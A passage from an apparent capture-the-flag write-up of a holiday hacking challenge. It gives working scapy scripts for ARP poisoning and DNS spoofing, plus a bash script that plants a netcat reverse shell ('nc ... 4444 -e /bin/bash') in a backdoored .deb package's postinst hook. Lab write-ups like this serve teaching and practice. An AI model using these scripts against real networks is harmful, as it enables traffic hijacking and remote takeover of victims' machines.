<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>guest@b0fe959ddcac:~/scripts$ tcpdump
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
15:52:15.869362 ARP, Request who-has winsrvdc2019.guestnet0.kringlecastle.com tell arp_requester.guestnet0.kringlecastle.com, length 28
15:52:16.917383 ARP, Request who-has winsrvdc2019.guestnet0.kringlecastle.com tell arp_requester.guestnet0.kringlecastle.com, length 28
15:52:17.957376 ARP, Request who-has winsrvdc2019.guestnet0.kringlecastle.com tell arp_requester.guestnet0.kringlecastle.com, length 28
15:52:19.009424 ARP, Request who-has winsrvdc2019.guestnet0.kringlecastle.com tell arp_requester.guestnet0.kringlecastle.com, length 28
^C
4 packets captured
4 packets received by filter
0 packets dropped by kernel
</code></pre></div><p>With name resolution turned off (<code>-n</code> flag), we can also get a good idea of which IP&rsquo;s specifically were at play here:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>guest@b0fe959ddcac:~/scripts$ tcpdump -n
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
15:52:24.245355 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
15:52:25.293394 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
15:52:26.337427 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
15:52:27.381423 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
^C
4 packets captured
4 packets received by filter
0 packets dropped by kernel
</code></pre></div><p>Neat, so the host we&rsquo;re interested in is asking (every second?) who has 10.6.6.53! ARP being a layer 2 protocol means we&rsquo;d be interested in the MAC addresses used to be able to craft a legitimate response using the provided script. Another way to view network traffic is to use <code>tshark</code>. In this case it would print out the relevant MAC addresses too.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>guest@b0fe959ddcac:~/scripts$ tshark -n
Capturing on &#39;eth0&#39;
    1 0.000000000 4c:24:57🆎ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
    2 1.047977896 4c:24:57🆎ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
    3 2.092716820 4c:24:57🆎ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
    4 3.147953807 4c:24:57🆎ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
^C4 packets captured
</code></pre></div><p>Neat, <code>4c:24:57🆎ed:84</code> is making the ARP request, so let&rsquo;s forge a response, saying that we are that host! This is where the <code>arp_resp.py</code> script given to us in the <code>scripts/</code> directory will be handy. The parts we need to complete are clearly marked too. Now, an ARP packet actually contains a number of fields. You could view the pcaps in Wireshark (or Cloudshark like the hints had), or, since we&rsquo;re receiving a new ARP request every second, we can use scapy to capture a packet and then just copy out the relevant fields from there. The provided script actually has all the code we need too!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>&gt;&gt;&gt; from scapy.all import *
&gt;&gt;&gt; sniff(filter=&#34;(arp[6:2] = 1)&#34;, count=1)
&lt;Sniffed: TCP:0 UDP:0 ICMP:0 Other:1&gt;
&gt;&gt;&gt; a=_
&gt;&gt;&gt; a[0]
&lt;Ether  dst=ff:ff:ff:ff:ff:ff src=4c:24:57🆎ed:84 type=ARP |&lt;ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=who-has hwsrc=4c:24:57🆎ed:84 psrc=10.6.6.35 hwdst=00:00:00:
00:00:00 pdst=10.6.6.53 |&gt;&gt;
</code></pre></div><p>Here we can see all of the <code>ARP</code> fields we need, except for the value of <code>ptype</code> which you will see is <code>0x800</code> when viewed in wireshark. So, to complete the script using that captured packet as reference, I had:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python3</span>
<span style=color:#f92672>from</span> scapy.all <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
<span style=color:#f92672>import</span> netifaces <span style=color:#66d9ef>as</span> ni
<span style=color:#f92672>import</span> uuid

<span style=color:#75715e># Our eth0 ip</span>
ipaddr <span style=color:#f92672>=</span> ni<span style=color:#f92672>.</span>ifaddresses(<span style=color:#e6db74>&#39;eth0&#39;</span>)[ni<span style=color:#f92672>.</span>AF_INET][<span style=color:#ae81ff>0</span>][<span style=color:#e6db74>&#39;addr&#39;</span>]
<span style=color:#75715e># Our eth0 mac address</span>
macaddr <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;:&#39;</span><span style=color:#f92672>.</span>join([<span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{:02x}</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>format((uuid<span style=color:#f92672>.</span>getnode() <span style=color:#f92672>&gt;&gt;</span> i) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xff</span>) <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>8</span><span style=color:#f92672>*</span><span style=color:#ae81ff>6</span>,<span style=color:#ae81ff>8</span>)][::<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>])

us <span style=color:#f92672>=</span> ni<span style=color:#f92672>.</span>ifaddresses(<span style=color:#e6db74>&#39;eth0&#39;</span>)[ni<span style=color:#f92672>.</span>AF_LINK][<span style=color:#ae81ff>0</span>][<span style=color:#e6db74>&#39;addr&#39;</span>]
them <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;4c:24:57🆎ed:84&#34;</span>

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>handle_arp_packets</span>(packet):
    <span style=color:#75715e># if arp request, then we need to fill this out to send back our mac as the response</span>
    <span style=color:#66d9ef>if</span> ARP <span style=color:#f92672>in</span> packet <span style=color:#f92672>and</span> packet[ARP]<span style=color:#f92672>.</span>op <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>:
        ether_resp <span style=color:#f92672>=</span> Ether(dst<span style=color:#f92672>=</span>them, type<span style=color:#f92672>=</span><span style=color:#ae81ff>0x806</span>, src<span style=color:#f92672>=</span>us)
        arp_response <span style=color:#f92672>=</span> ARP(pdst<span style=color:#f92672>=</span>them)
        arp_response<span style=color:#f92672>.</span>op <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>
        arp_response<span style=color:#f92672>.</span>plen <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>
        arp_response<span style=color:#f92672>.</span>hwlen <span style=color:#f92672>=</span> <span style=color:#ae81ff>6</span>
        arp_response<span style=color:#f92672>.</span>ptype <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0800</span>
        arp_response<span style=color:#f92672>.</span>hwtype <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
        arp_response<span style=color:#f92672>.</span>hwsrc <span style=color:#f92672>=</span> us
        arp_response<span style=color:#f92672>.</span>psrc <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;10.6.6.53&#34;</span>
        arp_response<span style=color:#f92672>.</span>hwdst <span style=color:#f92672>=</span> them
        arp_response<span style=color:#f92672>.</span>pdst <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;10.6.6.35&#34;</span>
        response <span style=color:#f92672>=</span> ether_resp<span style=color:#f92672>/</span>arp_response
        sendp(response, iface<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;eth0&#34;</span>)

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
    <span style=color:#75715e># We only want arp requests</span>
    berkeley_packet_filter <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;(arp[6:2] = 1)&#34;</span>
    <span style=color:#75715e># sniffing for one packet that will be sent to a function, while storing none</span>
    sniff(filter<span style=color:#f92672>=</span>berkeley_packet_filter, prn<span style=color:#f92672>=</span>handle_arp_packets, store<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>, count<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)

<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
    main()
</code></pre></div><p><em>Note: The <code>us</code> variable is the result of me realising that if the environment is refreshed (you closed the terminal or something else happened), your IP address and MAC address could change. So, that part is just to ignore those and just pull whatever the current value is.</em></p>
<p>Having tshark open in one window while running <code>python3 arp_resp.py</code> to effectively perform an ARP poisoning attack, we would see the next step in the challenge.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/arp_shenanigans_dns_request.png> <figcaption>
arp shenanigans dns request after arp poison
</figcaption>
</figure>
<p>Our ARP response and the new DNS request for <code>ftp.osuosl.org</code> extracted:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>    6 4.228167027 02:42:0a:06:00:03 → 4c:24:57🆎ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03
    7 4.268778840    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
</code></pre></div><p>After telling 10.6.6.35 that &ldquo;hey, we&rsquo;re that 10.6.6.53 ip you&rsquo;re looking for!&rdquo;, a DNS lookup for ftp.osuosl.org follows soon after. Yep, you guessed it, we need to reply with an IP, and preferably <em>our</em> IP!</p>
<p>The <code>dns_resp.py</code> script needed some carefully considered modifications. Once specific change I had to make was to relax the packet filter rules as scapy was not seeing the incoming DNS traffic. You also have to consider <em>how</em> the DNS request got to us, and what a typical response conversation would have looked like. If we take a look at another <code>tcpdump</code> session after performing the ARP poison, you&rsquo;d see what I want to get to.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>guest@b0fe959ddcac:~/scripts$ tcpdump -n &#34;port 53&#34;
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
16:09:39.597827 IP 10.6.6.35.28203 &gt; 10.6.6.53.53: 0+ A? ftp.osuosl.org. (32)
</code></pre></div><p>The incoming DNS request came from 10.6.6.35 on port 28203 to 10.6.6.53 on port 53. That means our reply needs to be sent to 10.6.6.35 on port 28203, coming from port 53. The thing is though, every request coming in from 10.6.6.35 will have a random high port like this (it’s part of how TCP/IP works), so we need to make sure we parse that in our python script to ensure the reply is sent where it&rsquo;s expected.</p>
<p>Layer 3 aside, we also need to remember that this DNS request came in to us as a result of an ARP spoofing attack, so when we craft the reply packet we need to ensure that we have the correct layer 2 packet configured as well.</p>
<p>Let&rsquo;s complete the script sections that will deal with the TCP/IP transport first, and then we&rsquo;ll move on the DNS specific portion of the packet.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># destination ip we arp spoofed</span>
ipaddr_we_arp_spoofed <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;10.6.6.35&#34;</span>
us <span style=color:#f92672>=</span> ni<span style=color:#f92672>.</span>ifaddresses(<span style=color:#e6db74>&#39;eth0&#39;</span>)[ni<span style=color:#f92672>.</span>AF_LINK][<span style=color:#ae81ff>0</span>][<span style=color:#e6db74>&#39;addr&#39;</span>]
them <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;4c:24:57🆎ed:84&#34;</span>

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>handle_dns_request</span>(packet):
    eth <span style=color:#f92672>=</span> Ether(src<span style=color:#f92672>=</span>us, dst<span style=color:#f92672>=</span>packet[Ether]<span style=color:#f92672>.</span>src)                  <span style=color:#75715e># need to replace mac addresses</span>
    ip  <span style=color:#f92672>=</span> IP(dst<span style=color:#f92672>=</span>packet[IP]<span style=color:#f92672>.</span>src, src<span style=color:#f92672>=</span>packet[IP]<span style=color:#f92672>.</span>dst)            <span style=color:#75715e># need to replace IP addresses</span>
    udp <span style=color:#f92672>=</span> UDP(dport<span style=color:#f92672>=</span>packet[UDP]<span style=color:#f92672>.</span>sport, sport<span style=color:#f92672>=</span>packet[UDP]<span style=color:#f92672>.</span>dport) <span style=color:#75715e># need to replace ports</span>
    dns <span style=color:#f92672>=</span> DNS(
      <span style=color:#75715e># incomplete for now</span>
    )
    dns_response <span style=color:#f92672>=</span> eth <span style=color:#f92672>/</span> ip <span style=color:#f92672>/</span> udp <span style=color:#f92672>/</span> dns
    sendp(dns_response, iface<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;eth0&#34;</span>)
</code></pre></div><p>You should see in the above snippet that fields such as the source MAC address, the source port etc. are all parsed from the received packet stored in a variable called <code>packet</code>. Scapy makes it really simple to extract fields from a packet and here you can see how that is useful.</p>
<p>Alright, let&rsquo;s move on to the <code>DNS()</code> field. I found two resources that were immensely useful in recreating the necessary DNS packet. Those were <a href=https://thepacketgeek.com/scapy/building-network-tools/part-09/>https://thepacketgeek.com/scapy/building-network-tools/part-09/</a> and <a href=https://www.cs.dartmouth.edu/~sergey/netreads/local/reliable-dns-spoofing-with-python-scapy-nfqueue.html>https://www.cs.dartmouth.edu/~sergey/netreads/local/reliable-dns-spoofing-with-python-scapy-nfqueue.html</a>. My initial attempts at this resulted in a <code>DNS()</code> field that looked like this:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>    dns <span style=color:#f92672>=</span> DNS(
        id<span style=color:#f92672>=</span>packet[DNS]<span style=color:#f92672>.</span>id,
        qd<span style=color:#f92672>=</span>packet[DNS]<span style=color:#f92672>.</span>qd,
        an<span style=color:#f92672>=</span>DNSRR(rrname<span style=color:#f92672>=</span>packet[DNSQR]<span style=color:#f92672>.</span>qname, rdata<span style=color:#f92672>=</span>ipaddr)<span style=color:#f92672>/</span>DNSRR(rrname<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;ftp.osuosl.org&#34;</span>,rdata<span style=color:#f92672>=</span>ipaddr)
    )
</code></pre></div><p>One final tweak I made was to create an infinite loop for the <code>sniff()</code> function. I did not want to race the ARP spoof and incoming DNS request, and it had the added bonus of making the attack easily repeatable for the later stages as I was debugging my scripts. Anyways, running the <code>dns_resp.py</code> (which had the infinite loop now) and then <code>arp_resp.py</code> script while watching DNS dump resulted in:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
16:18:49.245472 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
16:18:50.357351 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
16:18:51.405393 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
16:18:51.445590 ARP, Reply 10.6.6.53 is-at 02:42:0a:06:00:03, length 28
16:18:51.473763 IP 10.6.6.35.16029 &gt; 10.6.6.53.53: 0+ A? ftp.osuosl.org. (32)
16:18:51.498067 IP 10.6.6.53.53 &gt; 10.6.6.35.16029: 0*- [0q] 2/0/0 A 10.6.0.3, A 10.6.0.3 (72)
16:18:52.461391 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
16:18:53.517373 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
</code></pre></div><p>I could see the incoming DNS request, and I could see a response (with the correct reverse port mapping), but nothing happened afterwards. Hmm. I double checked my code, double checked my references, but nothing. As I continued debugging this, I figured I needed to take a closer look at the DNS response packet I was generating. Not from a code perspective, but rather from a packet dump perspective.</p>
<p>There is a <code>-Y</code> flag available for <code>tshark</code> which allows us to specify a packet dissector. Something you automatically get when using the Wireshark GUI, but not when using the CLI. So, to get <code>tshark</code> to show me details about the DNS packets that were flowing up and down, I ran it with <code>tshark -n -i eth0 -Y "dns" -V</code>.</p>
<p>For the sake of brevity I&rsquo;m going to strip the layer 2/3 stuff, and instead focus on the DNS dissection. Here was the incoming packet.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>[ ... ]

Domain Name System (query)
    Transaction ID: 0x0000
    Flags: 0x0100 Standard query
        0... .... .... .... = Response: Message is a query
        .000 0... .... .... = Opcode: Standard query (0)
        .... ..0. .... .... = Truncated: Message is not truncated
        .... ...1 .... .... = Recursion desired: Do query recursively
        .... .... .0.. .... = Z: reserved (0)
        .... .... ...0 .... = Non-authenticated data: Unacceptable
    Questions: 1
    Answer RRs: 0
    Authority RRs: 0
    Additional RRs: 0
    Queries
        ftp.osuosl.org: type A, class IN
            Name: ftp.osuosl.org
            [Name Length: 14]
            [Label Count: 3]
            Type: A (Host Address) (1)
            Class: IN (0x0001)
</code></pre></div><p>The response however, while it may seem right at first glance, wasn&rsquo;t.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>[ ... ]

Domain Name System (query)
    Transaction ID: 0x0000
        [Expert Info (Warning/Protocol): DNS query retransmission. Original request in frame 6]
            [DNS query retransmission. Original request in frame 6]
            [Severity level: Warning]
            [Group: Protocol]
    Flags: 0x0100 Standard query
        0... .... .... .... = Response: Message is a query
        .000 0... .... .... = Opcode: Standard query (0)
        .... ..0. .... .... = Truncated: Message is not truncated
        .... ...1 .... .... = Recursion desired: Do query recursively
        .... .... .0.. .... = Z: reserved (0)
        .... .... ...0 .... = Non-authenticated data: Unacceptable
    Questions: 1
    Answer RRs: 2
    Authority RRs: 0
    Additional RRs: 0
    Queries
        ftp.osuosl.org: type A, class IN
            Name: ftp.osuosl.org
            [Name Length: 14]
            [Label Count: 3]
            Type: A (Host Address) (1)
            Class: IN (0x0001)
    Answers
        ftp.osuosl.org: type A, class IN, addr 10.6.0.3
            Name: ftp.osuosl.org
            Type: A (Host Address) (1)
            Class: IN (0x0001)
            Time to live: 0 (0 seconds)
            Data length: 4
            Address: 10.6.0.3
        ftp.osuosl.org: type A, class IN, addr 10.6.0.3
            Name: ftp.osuosl.org
            Type: A (Host Address) (1)
            Class: IN (0x0001)
            Time to live: 0 (0 seconds)
            Data length: 4
            Address: 10.6.0.3
    [Retransmitted request. Original request in: 6]
    [Retransmission: True]
</code></pre></div><p>Hah! I was responding with another query type packet, even though my response had answers! Derp. that helped me focus in on where to look (the transport was fine, the packet itself was not), which finally led me to the <code>aa</code> and <code>qr</code> fields! <code>aa</code> specifies that this is an authoritative answer (not necessarily required), but more importantly <code>qr</code> is a bitfield that specifies if this packet is a <em>query</em> (<code>0</code>), or a <em>response</em> (<code>1</code>). My completed script was therefore:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python3</span>
<span style=color:#f92672>from</span> scapy.all <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
<span style=color:#f92672>import</span> netifaces <span style=color:#66d9ef>as</span> ni
<span style=color:#f92672>import</span> uuid

<span style=color:#75715e># creds:</span>
<span style=color:#75715e>#   https://thepacketgeek.com/scapy/building-network-tools/part-09/</span>
<span style=color:#75715e>#   https://www.cs.dartmouth.edu/~sergey/netreads/local/reliable-dns-spoofing-with-python-scapy-nfqueue.html</span>

<span style=color:#75715e># Our eth0 IP</span>
ipaddr <span style=color:#f92672>=</span> ni<span style=color:#f92672>.</span>ifaddresses(<span style=color:#e6db74>&#39;eth0&#39;</span>)[ni<span style=color:#f92672>.</span>AF_INET][<span style=color:#ae81ff>0</span>][<span style=color:#e6db74>&#39;addr&#39;</span>]
<span style=color:#75715e># Our Mac Addr</span>
macaddr <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;:&#39;</span><span style=color:#f92672>.</span>join([<span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{:02x}</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>format((uuid<span style=color:#f92672>.</span>getnode() <span style=color:#f92672>&gt;&gt;</span> i) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xff</span>) <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>8</span><span style=color:#f92672>*</span><span style=color:#ae81ff>6</span>,<span style=color:#ae81ff>8</span>)][::<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>])

<span style=color:#75715e># destination ip we arp spoofed</span>
ipaddr_we_arp_spoofed <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;10.6.6.35&#34;</span>
us <span style=color:#f92672>=</span> ni<span style=color:#f92672>.</span>ifaddresses(<span style=color:#e6db74>&#39;eth0&#39;</span>)[ni<span style=color:#f92672>.</span>AF_LINK][<span style=color:#ae81ff>0</span>][<span style=color:#e6db74>&#39;addr&#39;</span>]
them <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;4c:24:57🆎ed:84&#34;</span>

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>handle_dns_request</span>(packet):
    eth <span style=color:#f92672>=</span> Ether(src<span style=color:#f92672>=</span>us, dst<span style=color:#f92672>=</span>packet[Ether]<span style=color:#f92672>.</span>src)                  <span style=color:#75715e># need to replace mac addresses</span>
    ip  <span style=color:#f92672>=</span> IP(dst<span style=color:#f92672>=</span>packet[IP]<span style=color:#f92672>.</span>src, src<span style=color:#f92672>=</span>packet[IP]<span style=color:#f92672>.</span>dst)            <span style=color:#75715e># need to replace IP addresses</span>
    udp <span style=color:#f92672>=</span> UDP(dport<span style=color:#f92672>=</span>packet[UDP]<span style=color:#f92672>.</span>sport, sport<span style=color:#f92672>=</span>packet[UDP]<span style=color:#f92672>.</span>dport) <span style=color:#75715e># need to replace ports</span>
    dns <span style=color:#f92672>=</span> DNS(
        id<span style=color:#f92672>=</span>packet[DNS]<span style=color:#f92672>.</span>id,
        qd<span style=color:#f92672>=</span>packet[DNS]<span style=color:#f92672>.</span>qd,
        aa<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>, qr<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>,
        ancount<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>,
        an<span style=color:#f92672>=</span>DNSRR(rrname<span style=color:#f92672>=</span>packet[DNSQR]<span style=color:#f92672>.</span>qname, rdata<span style=color:#f92672>=</span>ipaddr)<span style=color:#f92672>/</span>DNSRR(rrname<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;ftp.osuosl.org&#34;</span>,rdata<span style=color:#f92672>=</span>ipaddr)
    )
    dns_response <span style=color:#f92672>=</span> eth <span style=color:#f92672>/</span> ip <span style=color:#f92672>/</span> udp <span style=color:#f92672>/</span> dns
    sendp(dns_response, iface<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;eth0&#34;</span>)

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
    berkeley_packet_filter <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34; and &#34;</span><span style=color:#f92672>.</span>join( [
        <span style=color:#e6db74>&#34;udp dst port 53&#34;</span>,                              <span style=color:#75715e># dns</span>
        <span style=color:#e6db74>&#34;udp[10] &amp; 0x80 = 0&#34;</span>,                           <span style=color:#75715e># dns request</span>
        ] )
    <span style=color:#75715e># sniff the eth0 int without storing packets in memory and stopping after one dns request</span>
    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
        sniff(filter<span style=color:#f92672>=</span>berkeley_packet_filter, prn<span style=color:#f92672>=</span>handle_dns_request, store<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>, iface<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;eth0&#34;</span>, count<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)
<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
    main()
</code></pre></div><p>Great, so once we got the DNS answers to work fine, the next piece of the puzzle becomes clear using <code>tcpdump</code> again.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>16:53:34.977453 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
16:53:34.997602 ARP, Reply 10.6.6.53 is-at 02:42:0a:06:00:03, length 28
16:53:35.029864 IP 10.6.6.35.50215 &gt; 10.6.6.53.53: 0+ A? ftp.osuosl.org. (32)
16:53:35.062362 IP 10.6.6.53.53 &gt; 10.6.6.35.50215: 0*- 2/0/0 A 10.6.0.3, A 10.6.0.3 (92)
16:53:35.067876 IP 10.6.0.3.52476 &gt; 10.6.6.35.64352: Flags [S], seq 240645463, win 64240, options [mss 1460,sackOK,TS val 2437484659 ecr 0,nop,wscale 7], length 0
16:53:36.017388 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28

[ ... ]

16:53:36.102610 IP 10.6.6.35.55554 &gt; 10.6.0.3.80: Flags [S], seq 4003720740, win 64240, options [mss 1460,sackOK,TS val 1978770089 ecr 0,nop,wscale 7], length 0
16:53:36.102645 IP 10.6.0.3.80 &gt; 10.6.6.35.55554: Flags [R.], seq 0, ack 4003720741, win 0, length 0
</code></pre></div><p>A connection for TCP port 80 (amongst others). The other, new, non-port 80 traffic was TLS, but I think that may have been an artefact of other processes running on the target host? I don&rsquo;t know. Anyways, a port 80 connection implies a web request, so I fired up an http server using python, and re-ran the whole attack. This is where the DNS response script in a loop helped. I only had to run the ARP spoof manually.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/arp_shenanigans_http_request.png> <figcaption>
arp shenanigans http request after the DNS poison
</figcaption>
</figure>
<p>In our simple web server, we can see a request for <code>/pub/jfrost/backdoor/suriv_amd64.deb</code>.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>guest@a85cc3252902:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.6.6.35 - - [01/Jan/2021 16:59:38] code 404, message File not found
10.6.6.35 - - [01/Jan/2021 16:59:38] &#34;GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1&#34; 404 -
</code></pre></div><p>One of the hints on your badge would have helped with this part, which said:</p>
<blockquote>
<p>The malware on the host does an HTTP request for a .deb package. Maybe we can get command line access by sending it a <a href="http://www.wannescolman.be/?p=98">command in a customized .deb file</a>.</p>
</blockquote>
<p>The article that was linked to pretty much clearly tells you what you need to do from here. Backdoor a <code>.deb</code> file (of which there were many in the <code>debs/</code> folder). Since the target host we had was downloading one we could do the backdoor, rename it to what they were downloading and hope they would execute our shell.</p>
<p>I won’t repeat what the article clearly states, but instead show the script I wrote to automate it given that it took a few tries to get right.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e>#!/bin/bash
</span><span style=color:#75715e></span>
set -e

DEB<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;netcat-traditional_1.10-41.1ubuntu1_amd64.deb&#34;</span>
TPATH<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/tmp/packaging&#34;</span>

rm -Rf $TPATH
mkdir $TPATH
cd $TPATH

cp ~/debs/$DEB .
dpkg -x $DEB work
ar -x $DEB
tar xvf control.tar.xz ./control
tar xvf control.tar.xz ./postinst

mkdir work/DEBIAN

mv ./control work/DEBIAN/control
mv ./postinst work/DEBIAN/postinst

US<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>ip a | grep inet | grep -v <span style=color:#e6db74>&#34;127.0.0.1&#34;</span> | cut -d <span style=color:#e6db74>&#34; &#34;</span> -f6 | cut -d <span style=color:#e6db74>&#34;/&#34;</span> -f1<span style=color:#66d9ef>)</span>

cat <span style=color:#e6db74>&lt;&lt;EOT &gt;&gt; work/DEBIAN/postinst
</span><span style=color:#e6db74>nc $US 4444 -e /bin/bash &amp;
</span><span style=color:#e6db74>EOT</span>

dpkg-deb --build $TPATH/work/
</code></pre></div><p>This simply embedded a classic <code>netcat</code> reverse shell in the <code>.deb</code> file, which then served using the python HTTP server. One thing that cost me a <em>lot</em> of time was the fact that my fancy IP extraction one-liner was running <code>ip -c</code>, which enabled color output. This is great when you are the one that wants to read it, but not so much for computers. See the thing is that output resulted in an ANSI encoded string which when it got to the other side, meant that it broke the script and nothing happened. Yay :(</p>
<p>Anyhoo, executing the full attack looked something like this:</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/arp_shenanigans_pwnd.png> <figcaption>
arp shenanigans shell from 10.6.6.35
</figcaption>
</figure>
<p>From here we could just <code>cat /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt</code> and find that <code>Tanta Kringle</code> recused herself.</p>
